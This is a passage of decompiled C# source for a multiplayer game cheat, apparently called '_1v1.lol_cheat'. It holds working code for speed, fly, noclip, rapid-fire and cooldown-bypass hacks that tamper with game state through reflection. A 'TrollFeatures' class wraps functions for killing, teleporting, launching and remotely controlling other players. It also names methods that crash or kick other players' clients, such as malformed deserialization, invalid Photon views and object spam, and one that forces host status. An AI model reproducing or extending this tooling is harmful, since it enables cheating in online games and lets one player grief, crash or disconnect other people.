				if (CheatConfig.BaseMovementModifier <= 0.1f)
				{
					CheatConfig.BaseMovementModifier = 1f;
				}
			}
			if (CheatConfig.Speed)
			{
				Character.localCharacter.refs.movement.movementModifier = CheatConfig.BaseMovementModifier * CheatConfig.SpeedMultiply;
			}
			else
			{
				Character.localCharacter.refs.movement.movementModifier = CheatConfig.BaseMovementModifier;
			}
		}

		public static void ApplySuperJump()
		{
			if ((Object)(object)Character.localCharacter?.refs?.movement == (Object)null)
			{
				return;
			}
			if (CheatConfig.BaseJumpImpulse < 0f)
			{
				CheatConfig.BaseJumpImpulse = Character.localCharacter.refs.movement.jumpImpulse;
				if (CheatConfig.BaseJumpImpulse <= 0f)
				{
					CheatConfig.BaseJumpImpulse = 10f;
				}
			}
			if (CheatConfig.SuperJump)
			{
				Character.localCharacter.refs.movement.jumpImpulse = CheatConfig.BaseJumpImpulse * CheatConfig.JumpMultiplier;
			}
			else
			{
				Character.localCharacter.refs.movement.jumpImpulse = CheatConfig.BaseJumpImpulse;
			}
		}

		public static void ApplyClimbingSpeed()
		{
			if ((Object)(object)Character.localCharacter?.refs?.climbing == (Object)null)
			{
				return;
			}
			if (CheatConfig.BaseClimbingSpeed <= 0.1f)
			{
				CheatConfig.BaseClimbingSpeed = Character.localCharacter.refs.climbing.climbSpeed;
				if (CheatConfig.BaseClimbingSpeed <= 0.1f)
				{
					CheatConfig.BaseClimbingSpeed = 1f;
				}
			}
			Character.localCharacter.refs.climbing.climbSpeed = CheatConfig.BaseClimbingSpeed * CheatConfig.ClimbingSpeedMultiplier;
		}

		public static void ApplyFlyMode()
		{
			if (Character.localCharacter == null || (Object)(object)Character.localCharacter.refs?.ragdoll == (Object)null)
			{
				return;
			}
			if (_isFlying != CheatConfig.FlyMode)
			{
				_isFlying = CheatConfig.FlyMode;
				foreach (Bodypart part in Character.localCharacter.refs.ragdoll.partList)
				{
					if ((Object)(object)((part != null) ? part.Rig : null) != (Object)null)
					{
						part.Rig.useGravity = !_isFlying;
					}
				}
			}
			if (_isFlying)
			{
				HandleFlying();
			}
		}

		private static void HandleFlying()
		{
			if (!_isFlying || Character.localCharacter == null || (Object)(object)Character.localCharacter.refs?.ragdoll == (Object)null)
			{
				return;
			}
			Character localCharacter = Character.localCharacter;
			localCharacter.data.isGrounded = true;
			localCharacter.data.sinceGrounded = 0f;
			localCharacter.data.sinceJump = 0f;
			Vector3 val = Vector2.op_Implicit(localCharacter.input.movementInput);
			Vector3 normalized = ((Vector3)(ref localCharacter.data.lookDirection_Flat)).normalized;
			Vector3 val2 = Vector3.Cross(Vector3.up, normalized);
			Vector3 normalized2 = (val2).normalized;
			Vector3 val3 = normalized * val.y + normalized2 * val.x;
			if (localCharacter.input.jumpIsPressed)
			{
				val3 += Vector3.up;
			}
			if (localCharacter.input.crouchIsPressed)
			{
				val3 += Vector3.down;
			}
			_flyVelocity = Vector3.Lerp(_flyVelocity, (val3).normalized * CheatConfig.FlySpeed, Time.deltaTime * _acceleration);
			foreach (Bodypart part in localCharacter.refs.ragdoll.partList)
			{
				if ((Object)(object)((part != null) ? part.Rig : null) != (Object)null)
				{
					part.Rig.useGravity = false;
					part.Rig.linearVelocity = _flyVelocity;
				}
			}
		}

		public static void Disable()
		{
			CheatConfig.Speed = false;
			CheatConfig.FlyMode = false;
			CheatConfig.SuperJump = false;
		}
	}
	public static class NoClip
	{
		public static void Apply()
		{
			try
			{
				if ((Object)(object)Character.localCharacter?.refs?.ragdoll == (Object)null || Character.localCharacter.refs.ragdoll.partList == null)
				{
					return;
				}
				foreach (Bodypart part in Character.localCharacter.refs.ragdoll.partList)
				{
					if ((Object)(object)((part != null) ? part.gameObject : null) == (Object)null)
					{
						continue;
					}
					try
					{
						Collider component = part.gameObject.GetComponent<Collider>();
						if (component != null)
						{
							if (CheatConfig.NoClip)
							{
								component.isTrigger = true;
								component.enabled = false;
							}
							else
							{
								component.isTrigger = false;
								component.enabled = true;
							}
						}
					}
					catch
					{
					}
				}
				if (!((Object)(object)Character.localCharacter.gameObject != (Object)null))
				{
					return;
				}
				try
				{
					Collider component2 = Character.localCharacter.gameObject.GetComponent<Collider>();
					if (component2 != null)
					{
						if (CheatConfig.NoClip)
						{
							component2.isTrigger = true;
							component2.enabled = false;
						}
						else
						{
							component2.isTrigger = false;
							component2.enabled = true;
						}
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		public static void Disable()
		{
			CheatConfig.NoClip = false;
			if (!(Character.localCharacter != null) || !((Object)(object)Character.localCharacter.refs?.ragdoll != (Object)null))
			{
				return;
			}
			foreach (Bodypart part in Character.localCharacter.refs.ragdoll.partList)
			{
				if ((Object)(object)((part != null) ? part.gameObject : null) != (Object)null)
				{
					Collider component = part.gameObject.GetComponent<Collider>();
					if (component != null && component.isTrigger)
					{
						component.isTrigger = false;
					}
				}
			}
		}
	}
	public static class NoInteractCooldown
	{
		public static void Apply()
		{
			if (!CheatConfig.NoInteractCooldown || Character.localCharacter == null)
			{
				return;
			}
			try
			{
				FieldInfo field = typeof(Character).GetField("interactCooldown", BindingFlags.Instance | BindingFlags.NonPublic);
				if (field != null)
				{
					field.SetValue(Character.localCharacter, 0f);
				}
				FieldInfo field2 = typeof(Character).GetField("lastInteractTime", BindingFlags.Instance | BindingFlags.NonPublic);
				if (field2 != null)
				{
					field2.SetValue(Character.localCharacter, 0f);
				}
				if (!(Interaction.instance != null))
				{
					return;
				}
				Interaction.instance.readyToInteract = true;
				Interaction.instance.readyToReleaseInteract = true;
				if (Interaction.instance.currentHeldInteractible == null || !(Interaction.instance.currentConstantInteractableTime > 0f))
				{
					return;
				}
				Interaction.instance.currentInteractableHeldTime = Interaction.instance.currentConstantInteractableTime;
				if (!(Interaction.instance.currentInteractableHeldTime >= Interaction.instance.currentConstantInteractableTime))
				{
					return;
				}
				try
				{
					Interaction.instance.currentHeldInteractible.Interact_CastFinished(Character.localCharacter);
					Interaction.instance.readyToReleaseInteract = false;
					if (!Interaction.instance.currentHeldInteractible.holdOnFinish)
					{
						MethodInfo method = typeof(Interaction).GetMethod("CancelHeldInteract", BindingFlags.Instance | BindingFlags.NonPublic);
						if (method != null)
						{
							method.Invoke(Interaction.instance, null);
						}
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
	}
	public static class PlayerModifications
	{
		public static void ApplyModifications()
		{
			if (!(Character.localCharacter == null) && Character.localCharacter.photonView.IsMine)
			{
				Godmode.Apply();
				Movement.ApplySpeedHack();
				Movement.ApplySuperJump();
				Movement.ApplyClimbingSpeed();
				NoClip.Apply();
				Movement.ApplyFlyMode();
				InfiniteAmmo.Apply();
				RapidFire.Apply();
				NoInteractCooldown.Apply();
				MiscFeatures.ApplyUnlockAll();
				MiscFeatures.ApplyBingBongSpam();
				MiscFeatures.ApplyClearStatuses();
				MiscFeatures.ApplyRandomOutfits();
				FieldOfView.Apply();
				AntiFallOver.Apply();
			}
		}

		public static void Update()
		{
			FieldOfView.Apply();
		}

		public static void DisableAll()
		{
			Godmode.Disable();
			Movement.Disable();
			NoClip.Disable();
		}
	}
	public static class RapidFire
	{
		private static Dictionary<Item, float> _originalUsingTimes = new Dictionary<Item, float>();

		public static void Apply()
		{
			if (Character.localCharacter == null)
			{
				return;
			}
			if (Character.localCharacter.data.currentItem != null)
			{
				try
				{
					Item currentItem = Character.localCharacter.data.currentItem;
					if (CheatConfig.RapidFire)
					{
						if (!_originalUsingTimes.ContainsKey(currentItem))
						{
							FieldInfo field = typeof(Item).GetField("usingTimePrimary", BindingFlags.Instance | BindingFlags.Public);
							if (field != null)
							{
								float value = (float)field.GetValue(currentItem);
								_originalUsingTimes[currentItem] = value;
								field.SetValue(currentItem, 0.001f);
							}
						}
					}
					else if (_originalUsingTimes.ContainsKey(currentItem))
					{
						FieldInfo field2 = typeof(Item).GetField("usingTimePrimary", BindingFlags.Instance | BindingFlags.Public);
						if (field2 != null)
						{
							field2.SetValue(currentItem, _originalUsingTimes[currentItem]);
							_originalUsingTimes.Remove(currentItem);
						}
					}
				}
				catch
				{
				}
			}
			if (CheatConfig.RapidFire)
			{
				return;
			}
			foreach (KeyValuePair<Item, float> item in _originalUsingTimes.ToList())
			{
				if (item.Key == null)
				{
					_originalUsingTimes.Remove(item.Key);
					continue;
				}
				try
				{
					FieldInfo field3 = typeof(Item).GetField("usingTimePrimary", BindingFlags.Instance | BindingFlags.Public);
					if (field3 != null)
					{
						field3.SetValue(item.Key, item.Value);
					}
					_originalUsingTimes.Remove(item.Key);
				}
				catch
				{
				}
			}
		}
	}
	public static class Stamina
	{
		public static void ApplyReduction()
		{
			if (CheatConfig.ReduceStaminaConsumption && !(Character.localCharacter == null) && Character.localCharacter.photonView.IsMine && !(Character.localCharacter.data == null))
			{
				float num = CheatConfig.StaminaConsumptionPercent / 100f;
				float maxStamina = Character.localCharacter.GetMaxStamina();
				if (CheatConfig.LastStaminaForReduction < 0f)
				{
					CheatConfig.LastStaminaForReduction = Character.localCharacter.data.currentStamina;
				}
				float currentStamina = Character.localCharacter.data.currentStamina;
				if (currentStamina < CheatConfig.LastStaminaForReduction)
				{
					float num2 = CheatConfig.LastStaminaForReduction - currentStamina;
					float num3 = num2 * num;
					float num4 = num2 - num3;
					Character.localCharacter.data.currentStamina = Mathf.Min(currentStamina + num4, maxStamina);
					GUIManager.instance.bar.ChangeBar();
					currentStamina = Character.localCharacter.data.currentStamina;
				}
				CheatConfig.LastStaminaForReduction = currentStamina;
			}
		}

		public static void ResetTracking()
		{
			if (!CheatConfig.ReduceStaminaConsumption)
			{
				CheatConfig.LastStaminaForReduction = -1f;
			}
		}
	}
	public static class StatusEffects
	{
		public static void ClearAll()
		{
			if (Character.localCharacter == null || (Object)(object)Character.localCharacter.refs?.afflictions == (Object)null)
			{
				return;
			}
			try
			{
				int num = Enum.GetNames(typeof(STATUSTYPE)).Length;
				int num2 = -1;
				for (int i = 0; i < num; i++)
				{
					STATUSTYPE val = (STATUSTYPE)i;
					if ((int)val != 7 && (int)val != 5 && (int)val != 4 && (int)val != 9)
					{
						num2 = i;
					}
				}
				for (int j = 0; j < num; j++)
				{
					STATUSTYPE val2 = (STATUSTYPE)j;
					if ((int)val2 != 7 && (int)val2 != 5 && (int)val2 != 4 && (int)val2 != 9)
					{
						Character.localCharacter.refs.afflictions.SetStatus(val2, 0f, j == num2);
					}
				}
			}
			catch
			{
			}
		}

		public static void Clear()
		{
			if (Character.localCharacter == null)
			{
				return;
			}
			int num = Enum.GetNames(typeof(STATUSTYPE)).Length;
			for (int i = 0; i < num; i++)
			{
				STATUSTYPE val = (STATUSTYPE)i;
				if ((int)val != 7 && (int)val != 5 && (int)val != 4)
				{
					Character.localCharacter.refs.afflictions.SetStatus(val, 0f, true);
				}
			}
		}
	}
	public static class TrollFeatures
	{
		public static void Initialize(MonoBehaviour runner)
		{
			TrollHelpers.Initialize(runner);
		}

		public static void MakePlayerFall(Character target, float seconds = 5f, bool includeSelf = false)
		{
			PlayerManipulation.MakePlayerFall(target, seconds, includeSelf);
		}

		public static void MakePlayerWalkOffCliff(Character target, bool includeSelf = false)
		{
			PlayerManipulation.MakePlayerWalkOffCliff(target, includeSelf);
		}

		public static void UnFallPlayer(Character target, bool includeSelf = false)
		{
			PlayerManipulation.UnFallPlayer(target, includeSelf);
		}

		public static void KillPlayer(Character target, bool includeSelf = false)
		{
			PlayerManipulation.KillPlayer(target, includeSelf);
		}

		public static void RevivePlayer(Character target, bool applyStatus = false, bool includeSelf = false)
		{
			PlayerManipulation.RevivePlayer(target, applyStatus, includeSelf);
		}

		public static void RevivePlayerAtPosition(Character target, Vector3 position, bool applyStatus = false, bool includeSelf = false)
		{
			PlayerManipulation.RevivePlayerAtPosition(target, position, applyStatus, includeSelf);
		}

		public static void StickPlayerBodyPart(Character target, BodypartType bodypartType, Vector3 position, STATUSTYPE statusType = 0, float statusAmount = 0f, bool includeSelf = false)
		{
			PlayerManipulation.StickPlayerBodyPart(target, bodypartType, position, statusType, statusAmount, includeSelf);
		}

		public static void UnstickPlayer(Character target, bool includeSelf = false)
		{
			PlayerManipulation.UnstickPlayer(target, includeSelf);
		}

		public static void StartCarryPlayer(Character carrier, Character target, bool includeSelf = false)
		{
			PlayerManipulation.StartCarryPlayer(carrier, target, includeSelf);
		}

		public static void DropCarriedPlayer(Character carrier, Character target, bool includeSelf = false)
		{
			PlayerManipulation.DropCarriedPlayer(carrier, target, includeSelf);
		}

		public static void ZombifyPlayer(Character target, bool includeSelf = false)
		{
			PlayerManipulation.ZombifyPlayer(target, includeSelf);
		}

		public static void MakePlayerPassOut(Character target, bool includeSelf = false)
		{
			PlayerManipulation.MakePlayerPassOut(target, includeSelf);
		}

		public static void LaunchPlayer(Character target, Vector3 direction, float force = 50f, bool includeSelf = false)
		{
			PlayerManipulation.LaunchPlayer(target, direction, force, includeSelf);
		}

		public static void LaunchPlayerUp(Character target, float force = 50f, bool includeSelf = false)
		{
			PlayerManipulation.LaunchPlayerUp(target, force, includeSelf);
		}

		public static void LaunchPlayerTowardsMe(Character target, float force = 50f, bool includeSelf = false)
		{
			PlayerManipulation.LaunchPlayerTowardsMe(target, force, includeSelf);
		}

		public static void LaunchPlayerAway(Character target, float force = 50f, bool includeSelf = false)
		{
			PlayerManipulation.LaunchPlayerAway(target, force, includeSelf);
		}

		public static void MakePlayerSpin(Character target, float spinSpeed = 720f, float duration = 5f, bool includeSelf = false)
		{
			PlayerManipulation.MakePlayerSpin(target, spinSpeed, duration, includeSelf);
		}

		public static void TeleportPlayerRandomly(Character target, float minDistance = 30f, float maxDistance = 100f, bool includeSelf = false)
		{
			PlayerManipulation.TeleportPlayerRandomly(target, minDistance, maxDistance, includeSelf);
		}

		public static void TeleportPlayerToMe(Character target, bool includeSelf = false)
		{
			PlayerManipulation.TeleportPlayerToMe(target, includeSelf);
		}

		public static void TeleportPlayerToPosition(Character target, Vector3 position, bool includeSelf = false)
		{
			PlayerManipulation.TeleportPlayerToPosition(target, position, includeSelf);
		}

		public static void MakePlayerRagdoll(Character target, float duration = 5f)
		{
			PlayerManipulation.MakePlayerRagdoll(target, duration);
		}

		public static void GrabPlayer(Character target)
		{
			PlayerManipulation.GrabPlayer(target);
		}

		public static void ThrowPlayer(Character target, Vector3 direction, float force = 30f)
		{
			PlayerManipulation.ThrowPlayer(target, direction, force);
		}

		public static void ApplyAntigrav(Character target, float duration = 10f, bool includeSelf = false)
		{
			PlayerManipulation.ApplyAntigrav(target, duration, includeSelf);
		}

		public static void MakePlayerGlow(Character target, bool includeSelf = false)
		{
			PlayerManipulation.MakePlayerGlow(target, includeSelf);
		}

		public static void MakePlayerJumpRepeatedly(Character target, float interval = 0.5f, float duration = 5f, bool includeSelf = false)
		{
			PlayerManipulation.MakePlayerJumpRepeatedly(target, interval, duration, includeSelf);
		}

		public static void FreezePlayer(Character target, float duration = 5f, bool includeSelf = false)
		{
			PlayerManipulation.FreezePlayer(target, duration, includeSelf);
		}

		public static void MakeEveryoneJump(bool includeSelf = false)
		{
			PlayerManipulation.MakeEveryoneJump(includeSelf);
		}

		public static void MakeEveryoneFall(float seconds = 5f, bool includeSelf = false)
		{
			PlayerManipulation.MakeEveryoneFall(seconds, includeSelf);
		}

		public static void MakeEveryonePassOut(bool includeSelf = false)
		{
			PlayerManipulation.MakeEveryonePassOut(includeSelf);
		}

		public static void LaunchEveryoneUp(float force = 50f, bool includeSelf = false)
		{
			PlayerManipulation.LaunchEveryoneUp(force, includeSelf);
		}

		public static void TeleportEveryoneToMe(bool includeSelf = false)
		{
			PlayerManipulation.TeleportEveryoneToMe(includeSelf);
		}

		public static void MakeEveryoneSpin(float spinSpeed = 720f, float duration = 5f, bool includeSelf = false)
		{
			PlayerManipulation.MakeEveryoneSpin(spinSpeed, duration, includeSelf);
		}

		public static void MakePlayerJumpOffCliff(Character target, bool includeSelf = false)
		{
			PlayerManipulation.MakePlayerJumpOffCliff(target, includeSelf);
		}

		public static GameObject SpawnScoutmasterAndTarget(Character targetPlayer, Vector3? spawnPosition = null, bool includeSelf = false)
		{
			return _1v1.lol_cheat.Troll.EntityControl.SpawnScoutmasterAndTarget(targetPlayer, spawnPosition, includeSelf);
		}

		public static void ForceScoutmasterTarget(GameObject scoutmaster, Character targetPlayer)
		{
			_1v1.lol_cheat.Troll.EntityControl.ForceScoutmasterTarget(scoutmaster, targetPlayer);
		}

		public static void ForceZombieTarget(GameObject zombie, Character targetPlayer)
		{
			_1v1.lol_cheat.Troll.EntityControl.ForceZombieTarget(zombie, targetPlayer);
		}

		public static void StopForceScoutmasterTarget(GameObject scoutmaster)
		{
			_1v1.lol_cheat.Troll.EntityControl.StopForceScoutmasterTarget(scoutmaster);
		}

		public static void StopForceZombieTarget(GameObject zombie)
		{
			_1v1.lol_cheat.Troll.EntityControl.StopForceZombieTarget(zombie);
		}

		public static void StopForceAllScoutmasters()
		{
			_1v1.lol_cheat.Troll.EntityControl.StopForceAllScoutmasters();
		}

		public static void StopForceAllZombies()
		{
			_1v1.lol_cheat.Troll.EntityControl.StopForceAllZombies();
		}

		public static void StartRemoteControl(Character targetPlayer, bool includeSelf = false)
		{
			_1v1.lol_cheat.Troll.EntityControl.StartRemoteControl(targetPlayer, includeSelf);
		}

		public static void StopRemoteControl()
		{
			_1v1.lol_cheat.Troll.EntityControl.StopRemoteControl();
		}

		public static void OpenAllLuggage()
		{
			ItemManipulation.OpenAllLuggage();
		}

		public static void TeleportAllItems(Vector3 position)
		{
			ItemManipulation.TeleportAllItems(position);
		}

		public static void TeleportAllItemsToPlayer(Character target)
		{
			ItemManipulation.TeleportAllItemsToPlayer(target);
		}

		public static void TeleportAllItemsInFrontOfMe()
		{
			ItemManipulation.TeleportAllItemsInFrontOfMe();
		}

		public static void ForceDropAllItems(Character target, bool includeSelf = false)
		{
			ItemManipulation.ForceDropAllItems(target, includeSelf);
		}

		public static void StopTrollEffects(Character target)
		{
			TrollHelpers.StopTrollEffects(target);
		}

		public static void StopAllTrollEffects()
		{
			TrollHelpers.StopAllTrollEffects();
		}

		public static void StopAllCrashCoroutines()
		{
			TrollHelpers.StopAllCrashCoroutines();
		}

		public static void CrashPlayer_TriggerRelayBounds(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_TriggerRelayBounds(target, includeSelf);
		}

		public static void CrashPlayer_TornadoNullRefs(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_TornadoNullRefs(target, includeSelf);
		}

		public static void CrashPlayer_RescueHookNull(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_RescueHookNull(target, includeSelf);
		}

		public static void CrashPlayer_SpiderNull(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_SpiderNull(target, includeSelf);
		}

		public static void CrashPlayer_CharacterGrabbingNull(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_CharacterGrabbingNull(target, includeSelf);
		}

		public static void CrashPlayer_GetFedItemInvalid(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_GetFedItemInvalid(target, includeSelf);
		}

		public static void CrashPlayer_DirectPlayerRPCs(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_DirectPlayerRPCs(target, includeSelf);
		}

		public static void CrashPlayer_AllNullRefs(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_AllNullRefs(target, includeSelf);
		}

		public static void CrashPlayer_Inventory(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_Inventory(target, includeSelf);
		}

		public static void CrashPlayer_StatusArrayBounds(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_StatusArrayBounds(target, includeSelf);
		}

		public static void CrashPlayer_Deserialization(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_Deserialization(target, includeSelf);
		}

		public static void CrashPlayer_NullReferences(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_NullReferences(target, includeSelf);
		}

		public static void CrashPlayer_DivisionByZero(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_DivisionByZero(target, includeSelf);
		}

		public static void CrashPlayer_ObjectSpam(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_ObjectSpam(target, includeSelf);
		}

		public static void CrashPlayer_MaxArraySize(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_MaxArraySize(target, includeSelf);
		}

		public static void CrashPlayer_Statuses(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_Statuses(target, includeSelf);
		}

		public static void CrashPlayer_Afflictions(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_Afflictions(target, includeSelf);
		}

		public static void CrashPlayer_Thorns(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_Thorns(target, includeSelf);
		}

		public static void CrashPlayer_ReconnectData(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_ReconnectData(target, includeSelf);
		}

		public static void CrashPlayer_InvalidPhotonView(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_InvalidPhotonView(target, includeSelf);
		}

		public static void CrashPlayer_ExtremeValues(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_ExtremeValues(target, includeSelf);
		}

		public static void CrashPlayer_AllMethods(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_AllMethods(target, includeSelf);
		}

		public static void CrashPlayer_Ultimate(Character target, bool includeSelf = false)
		{
			CrashMethods.CrashPlayer_Ultimate(target, includeSelf);
		}

		public static void CrashAllPlayersAndDisconnect()
		{
			CrashMethods.CrashAllPlayersAndDisconnect();
		}

		public static void CrashAllPlayersStealth()
		{
			CrashMethods.CrashAllPlayersStealth();
		}

		public static void KickPlayer(Character target, bool includeSelf = false)
		{
			CrashMethods.KickPlayer(target, includeSelf);
		}

		public static void ForceHost()
		{
			CrashMethods.ForceHost();
		}
	}
	public static class EntityControl
	{
		private sealed class <ResetJumpInput>d__45 : IEnumerator<object>, IDisposable, IEnumerator
		{
			private int <>1__state;

			private object <>2__current;

			public Character character;

			object IEnumerator<object>.Current
			{
				get
				{
					return <>2__current;
				}
			}

			object IEnumerator.Current
			{
				get
				{
					return <>2__current;
				}
			}
			public <ResetJumpInput>d__45(int <>1__state)
			{
				this.<>1__state = <>1__state;
			}
			void IDisposable.Dispose()
			{
				<>1__state = -2;
			}

			private bool MoveNext()
			{
				switch (<>1__state)
				{
				default:
					return false;
				case 0:
					<>1__state = -1;
					<>2__current = null;
					<>1__state = 1;
					return true;
				case 1:
					<>1__state = -1;
					if (character != null && character.input != null)
					{
						character.input.jumpIsPressed = false;
					}
					return false;
				}
			}

			bool IEnumerator.MoveNext()
			{
				return this.MoveNext();
			}
			void IEnumerator.Reset()
			{
				throw new NotSupportedException();
			}
		}

		private static Dictionary<GameObject, List<MonoBehaviour>> _disabledAIComponentsByEntity = new Dictionary<GameObject, List<MonoBehaviour>>();

		private static Dictionary<Bodypart, bool> _playerBodypartKinematicStates = new Dictionary<Bodypart, bool>();

		private static Dictionary<Bodypart, RigidbodyConstraints> _playerBodypartConstraintStates = new Dictionary<Bodypart, RigidbodyConstraints>();

		private static Dictionary<GameObject, Dictionary<Renderer, bool>> _originalHeadRendererStates = new Dictionary<GameObject, Dictionary<Renderer, bool>>();

		private static GameObject _cameraOverrideObject = null;

		private static Vector3 _frozenPlayerPosition = Vector3.zero;

		private static bool _playerPositionFrozen = false;

		public static Vector3 FrozenPlayerPosition => _frozenPlayerPosition;

		public static bool PlayerPositionFrozen => _playerPositionFrozen;

		public static void EnableControl(GameObject entity)
		{
			if (entity == null)
			{
				Debug.LogError((object)"[EntityControl] Cannot enable control - entity is null");
				return;
			}
			if (CheatConfig.CurrentlyControlledEntity != null && (Object)(object)CheatConfig.CurrentlyControlledEntity != (Object)(object)entity)
			{
				DisableControl(CheatConfig.CurrentlyControlledEntity);
			}
			try
			{
				Character component = entity.GetComponent<Character>();
				if (component == null)
				{
					Debug.LogError((object)("[EntityControl] Entity " + ((Object)entity).name + " has no Character component"));
					return;
				}
				FreezePlayer();
				MakeHeadInvisible(entity, component);
				PrepareEntityForPlayerControl(entity);
				EnableEntityComponents(entity, component);
				TransferOwnership(entity);
				SetEntitySpectatable(component);
				CheatConfig.CurrentlyControlledEntity = entity;
				SwitchCameraToEntity(entity);
				Debug.Log((object)("[EntityControl] Successfully enabled control for entity: " + ((Object)entity).name));
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[EntityControl] Failed to enable control: " + ex.Message));
			}
		}

		public static void DisableControl(GameObject entity)
		{
			if (!(entity == null) && (Object)(object)CheatConfig.CurrentlyControlledEntity == (Object)(object)entity)
			{
				CheatConfig.CurrentlyControlledEntity = null;
				UnfreezePlayer();
				RestoreHeadVisibility(entity);
				RestoreEntityAI(entity);
				RestoreCameraToPlayer();
				Debug.Log((object)"[EntityControl] Disabled entity control");
			}
		}

		public static void ProcessInput(MonoBehaviour coroutineRunner, bool menuOpen)
		{
			if (CheatConfig.CurrentlyControlledEntity == null)
			{
				return;
			}
			GameObject currentlyControlledEntity = CheatConfig.CurrentlyControlledEntity;
			if (currentlyControlledEntity == null)
			{
				RestoreCameraToPlayer();
				DisableControl(null);
				return;
			}
			KeepPlayerFrozen();
			if (menuOpen)
			{
				return;
			}
			try
			{
				Character component = currentlyControlledEntity.GetComponent<Character>();
				if (!(component == null) && !(component.input == null) && !(component.data == null))
				{
					EnsureOwnership(currentlyControlledEntity);
					ProcessDirectMovementInput(component);
					ProcessMouseLookOnly(component);
					ProcessJumpInput(component, coroutineRunner);
					ProcessSprintInput(component);
					ProcessSpecialAbilities(currentlyControlledEntity, component);
					DisableAITargetFinding(currentlyControlledEntity, component);
				}
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[EntityControl] Error processing input: " + ex.Message));
			}
		}

		private static void ProcessDirectMovementInput(Character charComponent)
		{
			if (charComponent.input == null || charComponent.data == null)
			{
				return;
			}
			Vector2 zero = Vector2.zero;
			if (Input.GetKey((KeyCode)119))
			{
				zero.y += 1f;
			}
			if (Input.GetKey((KeyCode)115))
			{
				zero.y -= 1f;
			}
			if (Input.GetKey((KeyCode)97))
			{
				zero.x -= 1f;
			}
			if (Input.GetKey((KeyCode)100))
			{
				zero.x += 1f;
			}
			if (((Vector2)(ref zero)).magnitude > 1f)
			{
				((Vector2)(ref zero)).Normalize();
			}
			charComponent.input.movementInput = zero;
			if (((Vector2)(ref zero)).magnitude < 0.1f)
			{
				charComponent.input.movementInput = Vector2.zero;
			}
			if (!(((Vector2)(ref zero)).magnitude > 0.1f) || charComponent.data.isGrounded)
			{
				return;
			}
			Type type = Type.GetType("HelperFunctions");
			if (!(type != null))
			{
				return;
			}
			MethodInfo method = type.GetMethod("LineCheck", BindingFlags.Static | BindingFlags.Public);
			if (!(method != null))
			{
				return;
			}
			Type type2 = Type.GetType("HelperFunctions+LayerType");
			if (!(type2 != null))
			{
				return;
			}
			object obj = Enum.Parse(type2, "TerrainMap");
			object obj2 = method.Invoke(null, new object[3]
			{
				charComponent.Center,
				charComponent.Center + Vector3.down * 2f,
				obj
			});
			if (obj2 != null)
			{
				PropertyInfo property = obj2.GetType().GetProperty("transform");
				if (property != null && property.GetValue(obj2) != null)
				{
					charComponent.data.isGrounded = true;
					charComponent.data.sinceGrounded = 0f;
				}
			}
		}

		private static void ProcessSprintInput(Character charComponent)
		{
			if (!(charComponent.input == null) && !(charComponent.data == null))
			{
				bool key = Input.GetKey((KeyCode)304);
				charComponent.input.sprintIsPressed = key;
				charComponent.data.isSprinting = key;
				if (key)
				{
					charComponent.input.sprintToggleIsPressed = true;
				}
			}
		}

		private static void DisableAITargetFinding(GameObject entity, Character charComponent)
		{
			if (entity == null || charComponent == null)
			{
				return;
			}
			try
			{
				MonoBehaviour[] components = entity.GetComponents<MonoBehaviour>();
				foreach (MonoBehaviour val in components)
				{
					if (val == null)
					{
						continue;
					}
					Type type = ((object)val).GetType();
					string name = type.Name;
					if (name == "MushroomZombie")
					{
						PropertyInfo property = type.GetProperty("currentTarget");
						if (property != null && property.CanWrite)
						{
							property.SetValue(val, null);
						}
						PropertyInfo property2 = type.GetProperty("currentState");
						if (property2 != null)
						{
							Type nestedType = type.GetNestedType("State");
							if (nestedType != null)
							{
								object value = Enum.Parse(nestedType, "Chasing");
								property2.SetValue(val, value);
							}
						}
					}
					if (name == "Scoutmaster")
					{
						PropertyInfo property3 = type.GetProperty("currentTarget");
						if (property3 != null && property3.CanWrite)
						{
							property3.SetValue(val, null);
						}
					}
				}
			}
			catch
			{
			}
		}

		private static Vector3 CalculatePlayerTargetPosition(Character charComponent)
		{
			if (charComponent == null || Camera.main == null)
			{
				return charComponent.Center;
			}
			Vector2 val = Vector2.zero;
			if (Input.GetKey((KeyCode)119))
			{
				val.y += 1f;
			}
			if (Input.GetKey((KeyCode)115))
			{
				val.y -= 1f;
			}
			if (Input.GetKey((KeyCode)97))
			{
				val.x -= 1f;
			}
			if (Input.GetKey((KeyCode)100))
			{
				val.x += 1f;
			}
			if (((Vector2)(ref val)).magnitude > 1f)
			{
				val = ((Vector2)(ref val)).normalized;
			}
			if (((Vector2)(ref val)).magnitude < 0.1f)
			{
				return charComponent.Center;
			}
			Vector3 forward = Camera.main.transform.forward;
			Vector3 right = Camera.main.transform.right;
			forward.y = 0f;
			right.y = 0f;
			(forward).Normalize();
			(right).Normalize();
			Vector3 val2 = forward * val.y + right * val.x;
			Vector3 normalized = (val2).normalized;
			float num = 5f;
			Vector3 result = charComponent.Center + normalized * num;
			result.y = charComponent.Center.y;
			return result;
		}

		private static void SetAITargetToPlayerInput(GameObject entity, Character charComponent, Vector3 targetPosition)
		{
			if (charComponent == null)
			{
				return;
			}
			try
			{
